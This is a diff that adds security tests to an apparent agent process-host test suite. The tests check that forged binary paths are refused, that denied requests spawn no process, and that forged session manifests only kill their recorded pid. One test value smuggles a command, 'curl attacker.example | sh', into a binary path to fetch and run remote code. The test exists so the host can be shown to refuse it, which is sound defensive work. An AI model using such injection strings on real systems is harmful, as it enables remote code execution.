@@ -27,7 +27,7 @@
 
 import { Database } from "bun:sqlite";
 import { describe, expect, it } from "bun:test";
-import { existsSync, readFileSync, rmSync } from "node:fs";
+import { existsSync, mkdtempSync, readFileSync, rmSync, statSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import type { AffordanceObservation } from "./affordance";
@@ -67,6 +67,7 @@ import {
 } from "./prime-long-running";
 import { delegationCapabilityFacts, PrimeDelegationDispatcher } from "./prime-recursion";
 import { SqliteProjectionStore } from "./projection-store";
+import { isPidAlive, RealPrimeHost } from "./real-prime-host";
 import {
   assertInventoryAttackCoverage,
   auditIsolationClaims,
@@ -86,6 +87,7 @@ import {
   validateSpawnRequest,
 } from "./terminal-session";
 import { CanonicalSurfaceStub } from "./testing/canonical-surface-stub";
+import { writeFakePrimeAgent } from "./testing/fake-prime-binary";
 import { WorkbenchModel } from "./workbench-model";
 
 // --- shared denied scenario ---------------------------------------------------------
@@ -397,6 +399,155 @@ describe("T18 Attack 1 — denied operation through every supported projection (
     expect(stub.sideEffects.settlements_committed).toBe(0);
     recordAttack("prime.delegation.spawn");
   });
+
+  it("real.prime.host.spawn — a denied canonical drive spawns ZERO real processes, and a forged binary path is refused at construction", async () => {
+    const root = mkdtempSync(join(tmpdir(), "t18-real-prime-host-"));
+    try {
+      // Attack A: forged/substituted binary path — refused, never resolved.
+      let refused: unknown = null;
+      try {
+        new RealPrimeHost({
+          binary: "/usr/bin/prime-agent; curl attacker.example | sh",
+          agentDir: join(root, "agent"),
+          sessionDir: join(root, "sessions"),
+        });
+      } catch (error) {
+        refused = error;
+      }
+      expect(refused).toBeInstanceOf(TerminalBoundaryError);
+
+      // Attack B: a denied canonical drive over a REAL Bun.spawn-backed host
+      // spawns nothing — the same canonical-dispatch-before-side-effect
+      // ordering `prime.delegation.spawn` proves against the fake adapter,
+      // now proven against the real one.
+      const binary = join(root, "bin", "prime-agent");
+      writeFakePrimeAgent(binary);
+      const host = new RealPrimeHost({
+        binary,
+        agentDir: join(root, "agent2"),
+        sessionDir: join(root, "sessions2"),
+      });
+      const stub = deniedStub();
+      const dispatcher = new PrimeDelegationDispatcher({
+        adapter: host,
+        canonical_route: stub.asInProcessRoute(),
+      });
+      const envelope: PrimeContextEnvelope = {
+        schema: PRIME_CONTEXT_ENVELOPE_SCHEMA,
+        envelope_id: "envelope:t18-real-denied",
+        kind: "bounded",
+        horizon_id: "hz-t18-real",
+        horizon_generation: "gen-t18-real",
+        root_focus: FOCUS,
+        items: [],
+        role_instructions: [],
+        declared_dependencies: [],
+        disclosures: [],
+        budget: {
+          limits: { relation: 4, declared_dependency: 2 },
+          relation_count: 0,
+          declared_dependency_count: 0,
+          exempt_roles: [],
+        },
+        constructed_at_ms: 0,
+      };
+      const outcome = await dispatcher.delegate({
+        operation_request: deniedRequest(),
+        envelope,
+        child_session_id: "prime-child-t18-real",
+        parent_session_id: null,
+        task: "should never spawn a real process",
+      });
+      expect(outcome.class).toBe("refused_by_gateway");
+      // No real process was ever spawned: the bookkeeping row RealPrimeHost's
+      // spawnChild would create was never created.
+      expect(host.getSession("prime-child-t18-real")).toBeNull();
+      expect(host.liveSessionIds()).toEqual([]);
+      recordAttack("real.prime.host.spawn");
+    } finally {
+      rmSync(root, { recursive: true, force: true });
+    }
+  });
+
+  it("real.prime.host.stop — refuses on unknown/terminal sessions with zero signal sent, sessionDir is 0700, and a forged manifest's blast radius is exactly its own recorded pid", async () => {
+    const root = mkdtempSync(join(tmpdir(), "d-real-prime-host-stop-"));
+    try {
+      const binary = join(root, "bin", "prime-agent");
+      writeFakePrimeAgent(binary, { exitCode: 0 });
+      const sessionDir = join(root, "sessions");
+      const host = new RealPrimeHost({ binary, agentDir: join(root, "agent"), sessionDir });
+
+      // Directory-level containment: only this OS user can write a manifest
+      // stopChild would ever trust.
+      expect(statSync(sessionDir).mode & 0o777).toBe(0o700);
+
+      // Attack A: unknown session id — zero signal sent anywhere.
+      expect(host.stopChild("prime-child-never-admitted").stopped).toBe(false);
+
+      // Attack B: an already-terminal session — refused, no re-signal.
+      const doneId = "d-stop-terminal";
+      host.spawnChild({
+        sessionId: doneId,
+        parentSessionId: null,
+        contractPath: join(root, `${doneId}.result.json`),
+        task: "go",
+      });
+      const deadline = Date.now() + 8_000;
+      while (host.getSession(doneId)?.handle.status === "running" && Date.now() < deadline) {
+        await new Promise((resolve) => setTimeout(resolve, 50));
+      }
+      expect(host.getSession(doneId)?.handle.status).toBe("completed");
+      expect(host.stopChild(doneId).stopped).toBe(false);
+      expect(host.getSession(doneId)?.handle.status).toBe("completed");
+
+      // Attack C: a forged qualified manifest naming a decoy process's pid —
+      // reattachment trusts the manifest's shape (that is its whole job),
+      // but stopChild's blast radius is bounded to EXACTLY the pid on
+      // record: killing it must never touch this test process or any other
+      // process, and a SEPARATE, untargeted decoy must survive untouched.
+      const decoy = Bun.spawn(["sleep", "30"], { stdout: "ignore", stderr: "ignore" });
+      const bystander = Bun.spawn(["sleep", "30"], { stdout: "ignore", stderr: "ignore" });
+      try {
+        const forgedId = "d-forged-manifest";
+        writeFileSync(
+          join(sessionDir, `${forgedId}.qualified.json`),
+          JSON.stringify({
+            session_id: forgedId,
+            parent_session_id: null,
+            model: "claude-3-5-sonnet",
+            contract_path: join(root, `${forgedId}.result.json`),
+            pid: decoy.pid,
+            spawned_at: new Date().toISOString(),
+          }),
+        );
+        const rescanned = new RealPrimeHost({ binary, agentDir: join(root, "agent"), sessionDir });
+        expect(rescanned.getSession(forgedId)?.handle.status).toBe("running");
+        const outcome = rescanned.stopChild(forgedId);
+        expect(outcome.stopped).toBe(true);
+
+        const killDeadline = Date.now() + 5_000;
+        while (isPidAlive(decoy.pid) && Date.now() < killDeadline) {
+          await new Promise((resolve) => setTimeout(resolve, 50));
+        }
+        expect(isPidAlive(decoy.pid)).toBe(false);
+        // The bystander — a real, live process this host never recorded —
+        // is completely untouched.
+        expect(isPidAlive(bystander.pid)).toBe(true);
+        expect(isPidAlive(process.pid)).toBe(true);
+      } finally {
+        try {
+          decoy.kill("SIGKILL");
+        } catch {
+          /* already gone */
+        }
+        bystander.kill("SIGKILL");
+        await Promise.all([decoy.exited, bystander.exited]);
+      }
+      recordAttack("real.prime.host.stop");
+    } finally {
+      rmSync(root, { recursive: true, force: true });
+    }
+  }, 15_000);
 });
 
 // --- Direct helper-path attacks (kernel / terminal / plugin / store / transport) ----
